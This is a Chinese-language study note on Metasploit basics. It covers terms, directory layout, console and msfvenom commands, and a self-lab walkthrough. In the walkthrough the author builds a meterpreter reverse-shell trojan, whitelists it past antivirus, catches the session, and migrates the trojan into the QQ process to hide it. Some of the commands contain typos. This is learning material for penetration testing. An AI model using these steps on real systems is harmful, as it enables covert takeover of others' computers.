### Metasploit初步认识

#### 一、Metasploit简介

`Metasploit`全称为`The Metasploit Framework`, 简称`MSF`. 它是一个漏洞框架, 内含许多攻击模块, 涵盖了包括从操作系统到Web应用的漏洞利用、后渗透模块、扫描模块等等

本笔记使用`Ubuntu 24.04`运行Metasploit框架

#### 二、Metasploit专业术语

- `Exploit(EXP)`
指利用系统漏洞进行攻击的动作

- `Payload`
指成功exploit后, 真正在目标系统执行的代码或指令

- `Shellcode`
是Payload的一种, 由于其建立正向/反向shell而得名

- `Module`
指MSF的各种攻击模块

- `Listener`
监听

#### 三、Metasploit目录结构

```
data
———— meterpreter
———— exploit
———— wordlists
———— templates
...

modules
———— exploit
———— payload
———— auxiliary
———— encoders
———— nops
———— post

scripts
———— meterpreter
———— ps
———— resource
———— shell
...

tools
———— context
———— dev
———— exploit
———— hardware
...

plugins
———— request.rb
———— thread.rb
———— alias.rb
———— lab.rb
...
```



### Metasploit基本命令

#### 一、msfconsole

- 启动
```
msfconsole	进入控制台
server postgresql start	启动数据库
msfdb init	数据库初始化
db_status	查看数据库链接状态
```

- show
```
show exploits	查看所有可用的渗透攻击程序代码
show auxiliary	查看所有可用的辅助攻击工具
show options	查看该模块所有可用选项
show payloads	查看该模块适用的所有载荷代码
show targets	查看该模块适用的攻击目标类型
```

- 系统操作
```
search	根据关键字搜索模块
info	显示模块的详细信息
use	进入使用模块
back	回退
set/unset	设置模块参数
save	保存当前设置
```
#### 二、msfvenom
- 主要参数
```
-p	payload
-e	编码方式
-i	编码次数
-b	在生成的程序中避免出现的值
LHOST	监听的主机地址
LPORT	监听的端口
-f exe >	生成exe格式
```



### Metasploit攻击示例

#### 一、被动攻击案例
假设本机为被攻击机, 使用`ipconfig`查看ip
```
无线局域网适配器 WLAN 2:
   连接特定的 DNS 后缀 . . . . . . . :
   IPv6 地址 . . . . . . . . . . . . : 240e:430:6cb1:9725:9656:8ce7:6969:10d9
   临时 IPv6 地址. . . . . . . . . . : 240e:430:6cb1:9725:95d0:c5f1:f3e1:d037
   本地链接 IPv6 地址. . . . . . . . : fe80::c8cd:e11b:b2ef:244c%23
   IPv4 地址 . . . . . . . . . . . . : 192.168.180.244
   子网掩码  . . . . . . . . . . . . : 255.255.255.0
   默认网关. . . . . . . . . . . . . : fe80::c8c1:67ff:fe75:d8bc%23
                                       192.168.180.249
```

获取目标ip为`192.168.180.244`

使用`msfvenom`命令生成一个简单的远程操控木马程序
```
msfvenom payload windows/x64/meterpreter/reverse_tcp LHOS=192.168.180.244 LPORT=4444 -f exe > test.exe
```

将生成的木马程序移动到目标机的任意位置并运行

这时大概率杀毒软件会报毒, 直接加入白名单即可

回到Metasploit, 使用`use expolits/multi/handler`进入模块
```
msf6 exploit(multi/handler) >
```

使用`show options`查看选项是否正确
```
Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.
```

可以看到`Payload`和`LHOST`没有设置
```
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.180.244
```

再次查看选项
```
Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST  192.168.180.244  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.
```

所有选项正确, 使用`run`命令启动模块
```
[*] Started reverse TCP handler on 192.168.180.244:4444
```

因为之前的杀软杀掉了进程, 我们需要再次手动打开木马程序
```
[*] Sending stage (203846 bytes) to 192.168.180.244
[*] Meterpreter session 2 opened (192.168.180.244:4444 -> 192.168.180.244:57394) at 2025-03-31 14:47:43 +0800
```

成功监听到会话, 使用`help`命令就可以查看meterpreter模块的所有命令

使用`ps`命令查看所有进程

使用`migrate <pid>`可以将木马程序的进程迁移进其它正常进程中, 防止被发现
```
18860  11864  test.exe	木马程序
25260  11740  QQ.exe	腾讯QQ
```

将进程迁移到QQ内
```
meterpreter > migrate 25260
[*] Migrating from 18860 to 25260...
[*] Migration completed successfully.
```

再次使用`ps`命令, 找不到原来的`test.exe`进程

#### 二、主动攻击案例
#### 三、metasploit渗透命令
#### 四、作业